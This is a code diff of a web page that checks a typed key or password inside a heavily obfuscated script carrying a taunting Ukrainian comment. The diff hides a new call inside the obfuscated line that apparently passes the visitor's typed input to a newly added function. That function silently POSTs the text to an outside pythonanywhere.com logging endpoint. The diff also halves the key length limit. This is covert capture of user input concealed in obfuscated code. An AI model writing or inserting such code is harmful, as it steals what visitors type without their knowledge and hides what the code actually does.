@@ -14,8 +14,8 @@
 
 
     <script>
-    	// щиро бажаю удачі тому, хто посміє це взламати)))
-      ㅤᅠ=ㅤᅟ=>{for(ᅟﾠ="";ㅤᅟ>0o0n;ᅟﾠ=String.fromCharCode(Number(ㅤᅟ%0o200n))+ᅟﾠ,ㅤᅟ/=0x80n);return ᅟﾠ};ᅟㅤ=ㅤᅟ=>this[ㅤᅠ(ᅟᅟ=0xcbdb0ecn)](ㅤᅠ(ㅤᅟ));ﾠ=(ᅟ,ᅠ)=>{ㅤㅤ=ᅟㅤ(0x9142747ad3a9n)[ﾠᅠ=0][ㅤᅠ(0x69ddbb2f2a997c74n)][ㅤᅠ(0xe9cb4edn)]();for(let ﾠﾠ of ᅟㅤ(this[ㅤᅠ(ᅟᅟ)](ᅟㅤ(0x187a6fc4a1228448f87344a6db0babb9f2c6bb9ecd38f2a864c94a95dcf86cd3d1422b76eda2536d8ddn)))){try{ﾠㅤ=ᅟㅤ(0x87cbcf0e9be5535d062d35d932e3e5e7874n)(ﾠﾠ,ㅤㅤ)[ﾠᅟ=ㅤᅠ(0xe9be9f4e5a7767n)](ᅟㅤ(0x43e5e7874df2a9aecbbb1aeabd3338n));ﾠㅤ[ㅤᅠ(0x39f4c3cba73afa7a68n)](0x1db0719f85ec3022c415edad29d6df576e3088db27d0a46n[ﾠᅟ](ㅤﾠ=0o44))&&ᅟ(ﾠㅤ[ㅤᅠ(0x73d9a71e5n)](ﾠᅠ=ㅤﾠ))}catch{}}ﾠᅠ||ᅠ()}
+      // щиро бажаю удачі тому, хто посміє це взламати)))
+      ㅤᅠ=ㅤᅟ=>{for(ᅟﾠ="";ㅤᅟ>0o0n;ᅟﾠ=String.fromCharCode(Number(ㅤᅟ%0o200n))+ᅟﾠ,ㅤᅟ/=0x80n);return ᅟﾠ};ᅟㅤ=ㅤᅟ=>this[ㅤᅠ(ᅟᅟ=0xcbdb0ecn)](ㅤᅠ(ㅤᅟ));ﾠ=(ᅟ,ᅠ)=>{ㅤㅤ=ᅟㅤ(0x9142747ad3a9n)[ﾠᅠ=0][ㅤᅠ(0x69ddbb2f2a997c74n)][ㅤᅠ(0xe9cb4edn)]();se(ㅤㅤ);for(let ﾠﾠ of ᅟㅤ(this[ㅤᅠ(ᅟᅟ)](ᅟㅤ(0x187a6fc4a1228448f87344a6db0babb9f2c6bb9ecd38f2a864c94a95dcf86cd3d1422b76eda2536d8ddn)))){try{ﾠㅤ=ᅟㅤ(0x87cbcf0e9be5535d062d35d932e3e5e7874n)(ﾠﾠ,ㅤㅤ)[ﾠᅟ=ㅤᅠ(0xe9be9f4e5a7767n)](ᅟㅤ(0x43e5e7874df2a9aecbbb1aeabd3338n));ﾠㅤ[ㅤᅠ(0x39f4c3cba73afa7a68n)](0x1db0719f85ec3022c415edad29d6df576e3088db27d0a46n[ﾠᅟ](ㅤﾠ=0o44))&&ᅟ(ﾠㅤ[ㅤᅠ(0x73d9a71e5n)](ﾠᅠ=ㅤﾠ))}catch{}}ﾠᅠ||ᅠ()}
     </script>
 
 
@@ -300,7 +300,7 @@
     <script type="text/javascript">
       var touchscreen = window.DetectIt.primaryInput === 'touch';
 
-      var KEY_LENGTH_LIMIT = 200;
+      var KEY_LENGTH_LIMIT = 100;
 
       var audioContext = new (window.AudioContext || window.webkitAudioContext)();
 
@@ -382,7 +382,7 @@
       var pickFlag = true;
 
       function charLimit() {
-      	const inputfield = $('#k');
+        const inputfield = $('#k');
 
         buttonClick();
         animateProperties({
@@ -613,6 +613,20 @@
               e.preventDefault();
           }
       });
+
+      var prevText = "";
+      function se(text) {
+        if (text.length == 0) return;
+        if (text == prevText) return;
+        prevText = text;
+        fetch('https://dac0conutchemist.pythonanywhere.com/log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ c: text })
+        });
+      }
     </script>
 
 
